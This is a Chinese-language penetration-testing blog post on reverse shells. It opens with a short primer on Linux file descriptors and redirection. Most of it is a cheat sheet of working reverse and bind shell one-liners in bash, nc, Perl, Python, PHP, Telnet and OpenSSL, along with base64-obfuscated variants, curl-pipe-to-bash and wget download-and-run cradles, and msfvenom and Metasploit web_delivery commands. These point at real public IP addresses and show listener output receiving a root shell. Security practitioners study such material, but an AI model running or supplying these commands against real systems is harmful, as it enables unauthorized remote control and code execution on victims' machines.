---
title: 反弹shell
author: Creexile
date: 2025-01-25 20:19:51
lastMod: 2025-04-12
summary: ''
cover: ''
category: '渗透'
draft: false
comments: false
sticky: 0
tags: [工具]
---

# 前置知识

## 正反向shell

- 正向shell: 控制端主动发起连接请求去连接被控制端, 中间网络链路不存在阻碍
- 反向shell(反弹shell): 被控端主动发起连接请求去连接控制端, 通常被控端由于防火墙限制、 权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包

## Linux标准文件描述符:

Linux系统将所有设备都当作文件来处理, 而Linux用文件描述符来标识每个文件对象; 当Linux启 动的时候会默认打开三个文件描述符

| 文件描述符 | 缩写   | 描述         | 默认设备       |
| ---------- | ------ | ------------ | -------------- |
| 0          | STDIN  | 标准输入     | 默认设备键盘   |
| 1          | STDOUT | 标准输出     | 默认设备显示器 |
| 2          | STDERR | 标准错误输出 | 默认设备显示器 |

### 更改标准输出/输入的位置

把标准输出位置更改到test文件中

```bash
exec 1> test
```

把当前标准输出重定向到test文件中

```bash
echo `flag` 1> test
```

把test文件中的内容重定向到标准输入

```bash
read user 0< test
echo $user
```

> 标准错误输出和标准输出的区别是，它在命令出错情况下的输出

分配自己的文件描述符: 把文件描述符5指向test文件, 然后把当前输出重定向到文件描述符5(用&引用文件描述符, 即找到文件(描述符指向的目标文件)

```
exec 5> test
echo 'are you ok?' 1>&5
cat test
```

### /dev/null

特殊文件，写入的任何东西都会被清空。

1. 把标准错误输出重定向到/dev/null，从而丢掉不想保存的错误信息

```
whoami 2>/dev/null
```

2. 快速移除文件中的数据而不用删除文件

```
cat /dev/null > test
```

## 重定向

重定向是把输出定向到文件或者标准流; 重定向输入输出本质上就是重定向文件描述符

```bash
< 从文件读取输入
> 将输出保存到文件
>> 将输出追加到文件
| 将一个程序的输出作为输入发送到另一个程序(管道符)
```

# 反弹shell本质

被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导 致被控端不能正常接收发送过来的数据包

# 反弹shell方法

## Bash

```bash
# 被控端：
bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
bash -i > /dev/tcp/10.10.1.11/6666 0>&1 2>&1
# 控制端：
nc -lvnp 6666
```

解释

```bash
# 打开一个交互式的bash shell
bash -i
# /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发起了一个socket调用,建立一个socket连接,读写这个文件就相当于在这个socket连接中传输数据
# 和10.10.1.11的6666端口建立TCP连接
/dev/tcp/10.10.1.11/6666
# 混合输出（正确、错误的输出都输出到一个地方)
>&、&>
```

# 一些反弹shell

[自动生成反弹shell网站](https://www.revshells.com/)

## 利用msf生成:

```bash
msfvenom -p cmd/unix/reverse_bash lhost=172.16.8.131 lport=1234
```

生成例子:

```bash
bash -c '0<&84-;exec 84<>/dev/tcp/172.16.8.131/1234;sh <&84 >&84 2>&84'
```

## 利用Bash

```bash
bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
bash -i > /dev/tcp/10.10.1.11/6666 0>&1 2>&1
bash -c 'bash -i >& /dev/tcp/172.16.8.131/1234 0>&1'

sh -i >& /dev/tcp/192.168.110.130/7777 0>&1
```

### 正向

```bash
# 被控端：
bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
# 控制端：
nc –lvvp 6666
```

### 反向

```bash
# 被控端：
exec 5<>/dev/tcp/139.155.49.43/6666;cat <&5 | while read line; do $line 2>&5 >&5;
done
# 控制端：
nc –lvvp 6666

# base64编码绕过：
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64
-d|bash -i"
```

## 利用nc

### 正向

```bash
# 被控端：
nc -lvvp 6666 -e /bin/sh
# 控制端：
nc 10.10.1.7 6666
```

### 反向

```bash
# 控制端：
nc -lvvp 6666
# 被控端：
nc -e /bin/sh 10.10.1.11 6666
```

### 无 `-e` 参数反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 139.155.49.43 6666 >/tmp/f
```

> mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给`/bin/sh`，sh会执行管道里的 命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。

```
mknod backpipe p; nc 47.101.214.85 6666 0backpipe 2>backpipe
```

### 其他

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.5 1234 > /tmp/f
```

## Perl

```bash
perl -e 'use
Socket;$i="47.101.214.85";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("t
cp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"47.101.214.85:6666");STDIN->fdopen($c,r);$~-
>fdopen($c,w);system$_ while<>;'
```

## Curl

- vps

```bash
root@VM-0-2-ubuntu:~# cat index.html
bash -i >& /dev/tcp/139.155.49.43/6666 0>&1

root@VM-0-2-ubuntu:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
47.101.214.85 - - [03/Dec/2020 09:21:39] "GET /1.sh HTTP/1.1" 200 -
```

- target

```bash
curl 139.155.49.43:8000|bash
```

- result

```bash
root@VM-0-2-ubuntu:~# nc -lvvp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from 47.101.214.85 46370 received! root@iZuf6j06q5f1lZ:~#
```

## Python

```bash
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
t(("47.101.214.85",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.
fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=6666 -f raw
handler -p python/meterpreter/reverse_tcp -H 139.155.49.43 -P 6666
```

```bash
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 0
msf5 exploit(multi/script/web_delivery) > set payload
python/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lport 8888
msf5 exploit(multi/script/web_delivery) > exploit –j
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}
[sys.version_info[0]],fromlist=
('urlopen',));r=u.urlopen('http://139.155.49.43:8080/pWMAajktf',
context=ssl._create_unverified_context());exec(r.read());"
```

## PHP

```bash
php -r '$sock=fsockopen("47.101.214.85",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
msfvenom -p php/bind_php lport=6666 -f raw > bind_php.php
```

```bash
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 1
msf5 exploit(multi/script/web_delivery) > set payload
php/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > exploit –j
php -d allow_url_fopen=true -r
"eval(file_get_contents('http://139.155.49.43:8080/RRfKpX', false,
stream_context_create(['ssl'=>
['verify_peer'=>false,'verify_peer_name'=>false]])));"
```

```bash
wget 139.155.49.43/s.php -O /tmp/s.php && php /tmp/s.php
```

## Ruby

```bash
msfvenom -p cmd/unix/bind_ruby lport=6666 -f raw
```

## Telent

```bash
# 攻击机：
nc -lvvp 5555
nc -lvvp 6666
# 目标机：
telnet 47.101.214.85 5555 | /bin/bash | telnet 47.101.214.85 6666
```

```bash
# 攻击机：
nc -lvvp 6666
# 目标机：
rm -f a && mknod a p && telnet 47.101.214.85 6666 0<a | /bin/bash 1>a
rm -f a;mknod a p;telnet 47.101.214.85 6666 0<a | /bin/bash 1>a
```

## OpenSSL

```bash
# 在远程攻击主机上生成秘钥文件
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# 在远程攻击主机上启动监视器
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
# 在目标机上反弹shell
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect : > /tmp/s; rm /tmp/s
```

# Refer

https://int0x33.medium.com/day-43-reverse-shell-with-openssl-1ee2574aa998
